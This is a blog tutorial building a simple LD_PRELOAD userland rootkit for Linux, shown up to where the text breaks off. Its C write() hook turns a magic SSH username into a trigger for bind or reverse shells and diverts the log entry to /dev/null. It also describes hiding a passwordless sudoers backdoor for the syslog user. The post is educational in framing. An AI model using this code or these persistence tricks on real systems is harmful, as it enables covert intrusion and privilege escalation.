---
layout: single
title: Making a Simple Userland Rootkit for Linux 
date: 2019-9-29
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - Linux
  - Socket Programming
  - C
  - Rootkits
  - LD_PRELOAD
  - Jynx Rootkit
--- 

## Background Information
This post is my solution for the last assignment in my [Learning-C](https://github.com/h0mbre/Learning-C) repository. I thought a good way to cap off a repo designed to introduce people to very basic C programming would be to take those very basic techinques and make a simple yet powerful security related tool, namely a malicious shared library rootkit.

I came across LD_PRELOAD rootkits while watching [a talk by @r00tkillah](https://www.youtube.com/watch?v=wyRRbow4-bc&feature=youtu.be) in 2016 about his initrd rootkit. He talks about historical approaches to Linux rootkits and the LD_PRELOAD approach gets some good coverage. Since it was described in the talk as a userland approach, I started reading about them and quickly discovered a few well-known implementations, namely the [Jynx Rootkit](https://github.com/chokepoint/Jynx2). Jynx has a lot of articles discussing its features and how to detect it. It was fairly robust, checking in at around 1,500 lines of code in the main file and hooking ~20 syscalls. 

My goal for this assignment since we had just learned how to hook syscalls in the previous assignment, was to create a userland rootkit which:
- provided a backdoor/command-shell opportunity,
- hid malicious network connections from `netstat` and `lsof`, and
- hid malicious files. 

**To be clear:** I'm fully aware this isn't a robust, red-team-ready rootkit ready to use for engagements. These techniques have been analyzed and discussed for around 7 years now. **BUT** it is sort of a niche subject and something I don't think many people have come across. I would also like to just point people towards blogs and posts that detail the technical details at play here instead of expounding on those details myself, as I am not an expert. 

All of this is possible with very simple C. (hacky, bad C at that!)

## Shared Libraries and LD_PRELOAD

A lot has been written on the topic of Shared Libraries so I won't spend much time here explaining them (we even touched on them in the last post). Shared or dynamic libraries define functions that the dynamic linker links to other programs during their run time. A common example is [libc](http://man7.org/linux/man-pages/man7/libc.7.html). This reduces the amount of code you need in a program executable because it shares function definitions with a library. 

`LD_PRELOAD` is a configurable environment variable that allows users to specify a shared library to be loaded into memory for programs before other shared libraries. Just a quick example, if we check the shared libraries used by `/bin/ls` on a standard x86 Kali box, we get:
```terminal_session
tokyo:~/ # ldd /bin/ls                                             
	linux-gate.so.1 (0xb7fcf000)
	libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7f57000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d79000)
	libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7d00000)
	libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7cfa000)
	/lib/ld-linux.so.2 (0xb7fd1000)
	libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7cd9000)
```

So we see a number of shared library dependencies for `/bin/ls`. If we set the environment variable for `LD_PRELOAD` to a notional shared library we can actually change what shared library dependencies that binary has. Furthermore, `LD_PRELOAD` allows us to specify that our chosen library is loaded into memory **before all others**. We can create a shared library called `example.so` and export it `LD_PRELOAD` as follows, and then check the library dependencies of `/bin/ls`: 
```terminal_session
tokyo:~/LearningC/ # export LD_PRELOAD=$PWD/example.so                                                                     
tokyo:~/LearningC/ # ldd /bin/ls                                                                                            
	linux-gate.so.1 (0xb7fc0000)
	/root/LearningC/example.so (0xb7f8f000)
	libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7f43000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d65000)
	libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7d5f000)
	libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7ce6000)
	/lib/ld-linux.so.2 (0xb7fc2000)
	libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7cc5000)
```

As you can see, our library at `/root/LearningC/example.so` is loaded first before any other library on disk. ([Awesome explanation](https://www.technovelty.org/linux/a-little-tour-of-linux-gateso.html) of that first library, "`linux-gate.so.1`")

It should be noted that by not specifying a binary after the path to our shared library, `LD_PRELOAD` will use the specified shared library for all dynamically linked programs system wide. 

## /etc/ld.so.preload
As a way to avoid setting environment variables, we are also allowed to create a text file called `/etc/ld.so.preload` and shared libraries stored in this file delimited by a white space will be `LD_PRELOAD`'d in a sense in the order that they're written, again, system-wide. There is no way to specify a binary this way, this will apply to all dynamically linked programs. We can see that dynamically linked programs check for this file's existence when they are called upon by using the `strace` utility to spy on what system calls a program makes when run. Let's again try `/bin/ls`:
```
tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbf8d8e60 /* 47 vars */) = 0
brk(NULL)                               = 0xbc1000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed6000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
-----snip-----
```

As you can see, `/bin/ls` calls the `access()` syscall, and checks to see if it has access to `/etc/ld.so.preload`; however, the return value is a `-1` indicating that the file does not exist (`No such file or directory`). 

Let's create the file and then run this excercise again:
```
tokyo:~/LearningC/ # echo "" > /etc/ld.so.preload                                                                           
tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbfcba0a0 /* 47 vars */) = 0
brk(NULL)                               = 0x570000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eff000
access("/etc/ld.so.preload", R_OK)      = 0
openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
-----snip-----
```

This time, we actually get an `openat()` syscall right after `access()` because access finishes with a return value of `0` indicating success. `openat()` returns a value of `3` as a file descriptor.

Let's input our malicious `example.so` library in `/etc/ld.so.preload` and see what `strace` has to say about it. 
```
tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbf956640 /* 47 vars */) = 0
brk(NULL)                               = 0x1a8f000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f64000
access("/etc/ld.so.preload", R_OK)      = 0
openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=27, ...}) = 0
mmap2(NULL, 27, PROT_READ|PROT_WRITE, MAP_PRIVATE, 3, 0) = 0xb7f92000
close(3)                                = 0
openat(AT_FDCWD, "/root/LearningC/example.so", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\21\0\0004\0\0\0"..., 512) = 512
```

We see that not only did it open `/etc/ld.so.preload`, it read some values from the file and then opened our shared library for reading. We were able to get our shared library loaded into memory for the run time of `/bin/ls`. 

## Hooking Syscalls with Shared Library Injections
As we have discussed in the `Learning C` progression, this preloading mechanism allows a `root` user to powerfully manipulate userland programs. We can effectively redefine common, frequently-used syscall functions and their higher-level abstraction wrapper functions to mean whatever we arbitrarily desire. If you need more information on this portion of our experiment please consult [Assignment-27](https://github.com/h0mbre/Learning-C/tree/master/Assignment-27) of our `Learning C` repo where we go over a lot of the information discussed so far. [In a previous example], we hooked `puts()` by using an example found in [this blog post](https://blog.netspi.com/function-hooking-part-i-hooking-shared-library-function-calls-in-linux/) to check its buffer for a string and if found, print a different message to the terminal. 

## The Noob Rootkit "Manteau"
To meet my aforementioned rootkit goals I didn't have to hook many syscalls. I ended up hooking `write()`, `readdir()`, `readdir64()`, `fopen()`, and `fopen64()`. If you discount the `64` variations for large file considerations, basically just 3 syscalls. With these 3 syscalls, we can hide from `netstat`, `lsof`, `ls`, and also spawn some plaintext connections to our attacker machine. "Manteau" means cloak in French, let's make this as corny as possible. 

## Hooking `write()` For a Trigger!
Hooking `write()` was surprisingly simple for our purposes. I wanted to create a cool way to activate/trigger our rootkit from an external host. There have been some really cool ways to do this developed over the years but I tried to be somewhat original. [The Jynx rootkit](https://github.com/chokepoint/Jynx2/blob/master/jynx2.c) I have discussed previously in the repo hooked the `accept()` syscall (which we will be using a lot in this post) to check local and source port information of the connection as a way to check if the connection came from the attacker. These values were hardcoded in their malicious library and could be set at compile time. It then would prompt for a password and spawn an encrypted back connect over `openssl`. We won't be doing anything that badass, but we will be doing something cool. 

### Making Syslog Evil
Initially, when contemplating ways to make a remote host do work after touching it in someway, I landed on the Apache `access.log`. What I thought I would do is, I would send a simple `GET HTTP` request with a magic string in the `User Agent:` field, and when the Apache process wrote that information to disk in the `access.log`, our hook would check the `write()` buffer for our magic string and if found, spawn a connection to our host. 

This actually worked, and it worked really well! However, there was a small problem. It actually required me restarting Apache after specifying our malicious library in `/etc/ld.so.preload` so that was aesthetically displeasing to me. I didn't like the fact that you'd have to restart a webservice for your rootkit, not saying our shared library is super stealth, but knocking over a webserver is kind of high-visibility. 

Along those same lines, I discovered that the `syslog` user writes failed SSH attempts to `auth.log`. It logs the user's username and IP address. Example entry: `Failed password for nobody from 91.205.189.15 port 38556 ssh2`. Awesome, we control the username field (`nobody` in the example) in a log on the system. The same problem applies, we must restart syslog after loading our shared library, but this isn't as high visibility as say, restarting Apache. (Linux sysadmins let me know if I'm wrong about that). 

A second problem we face is that we don't want to come back to this box as `syslog`, we want to come back as `root`. There are probably a million ways to leave yourself privesc breadcrumbs, especially given that you can hide arbitrary files, but I chose to just `visudo` the `sudoers` file and add `syslog`. I also inserted about 80 newlines after the last bit of visible text in the file before adding the `syslog ALL=(ALL) NOPASSWD:ALL` entry so that the casual `sudoers` file editor hopefully wouldn't notice. (LOL)

Alright, so we have a trigger idea and a built in privesc. Let's write some C finally!

### Write Hook
The `write()` hook I created is a lot like the `puts()` hi-jack we already studied surprisingly. The first portion looks like this: 
```C
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write");


    char *bind4 = strstr(buf, KEY_4);
    char *bind6 = strstr(buf, KEY_6);
    char *rev4 = strstr(buf, KEY_R_4);
    char *rev6 = strstr(buf, KEY_R_6);
 ```
 
 Let's break this down:
 + `ssize_t write(int fildes, const void *buf, size_t nbytes)` this is the man page declaration of the `write()` function. This has to match perfectly or the calling process won't use our shared library as a resource, it will continue to look for `write()` definition elsewhere. Now that we have the calling process' attention;
 + `ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);` we declare a second function with the same structure as the genuine `write()` function. This one is actually declaring a pointer but it is not yet initialized (it doesn't yet point to anything). `(*new_write)` says "this is a pointer to a function called `new_write()`" and then the rest of the declaration provides a definition for the function that will eventually be pointed to;
 + `new_write = dlsym(RTLD_NEXT, "write");` does something very crucial. We had already declared a pointer to `new_write()` but we hadn't yet initialized it. *Now* we are initializing it and giving it a memory address to point to. It is now going to point to the address returned by `dlsym` [https://linux.die.net/man/3/dlsym]. `dlsym` is a way to interface with the dynamic linker and we give it two arguments. We ask it to find the next occurence (`RTLD_NEXT`) in the subsequent linked libraries of the call `"write"`. `dlsym` returns the address of next occurence found of that `"write"` symbol. What would that be? Well, it's going to be the address of the **REAL** `write()` function, because it's going to consult the legitimate libraries after ours. So now, `new_write` is essentially just a reference to the actual real `write()` syscall as intended;
 + `ssize_t result;` we declare a variable of type `ssize_t` the data type returned by our `write()` function and call it `result`. 
 + The last four lines are very similar, `char *bind4 = strstr(buf, KEY_4);` delcares and initializes a new pointer variable of the `char` type that is equal to the result of the `strstr()` function after comparing the buffer being written (a reference to the `const void *buf` argument in our `write()` syscall) to a harcoded defined variable `KEY_4`. You can set `KEY_4` to whatever you like, I set it to `#define KEY_4 "notavaliduser4"`. `strstr()` is very interesting. If it finds the second argument within the first argument, it will return a pointer to the first occurence of the second argument. So if it returns a `NULL` we know that it didn't find a match. 
 
 Let's look at the next block of code:
 ```C
 if (bind4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind();
    }

    else if (bind6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_bind();
    }

    else if (rev4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_rev();
    }

    else if (rev6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_rev();
    }
 ```
 Although long, there's not a lot to get through here. We've basically used `if/else if` to check the buffer being written for mulitple sub-strings that we're using as our trigger. Let's break it down:
 + `if (bind4 != NULL)` we check to see if the variable `bind4` is `NULL` and if it's not, we jump to our logic;
 + `fildes = open("/dev/null", O_WRONLY | O_APPEND);` if it's not `NULL`, then we have a match, we know we're trying to activate the rootkit because we sent our magic string `notavaliduser4` as an SSH attempt. Of course that will fail, so `syslog` will log that and activate our hooked `write()` syscall. Since we have a match, we don't actually want it written to log that we tried to do fishy stuff. So let's re-route the `write()` operation by first using `open()` to open `/dev/null` in an append and write mode and then passing that return value to the `int filedes` variable we had already used in our function declaration. It should be mentioned that routing to `/dev/null` is just one solution, you could also just not `write()` at all. You are God here (well, userland God anyway);
 + `result = new_write(fildes, buf, nbytes);` we now do a normal write operation on `/dev/null` and give the return value to our `ssize_t result` variable we defined in our function declaration. This `result` variable can now be delivered to follow on functions. `syslog` calls something like `open()` to open `auth.log` it then calls `write()` because it has a buffer it needs to put in the file (our failed SSH attempt) and then the write operation returns a result in the form of our variable `result` which is probably just an indication of completion or failure. To the process, nothing here is broken, it called write, and got a result as intended. Know that when `syslog` called `write()` here, it had values it used as arguments in place of the function declaration arugments. It didn't pass `const void *buf` to `write()` when it called it for example, it passed it something like a pointer to a string that said "failed SSH attempt for...";
 + `ipv4_bind()` is the name of a function that is being called. That function is defined above in the program. We will show what that is later, but essentially it's just our IPV4 TCP bind shell that we wrote in a previous assignment on port 65065. So, our trigger hit the write buffer, was written to `/dev/null` instead of `/var/log/auth.log` 





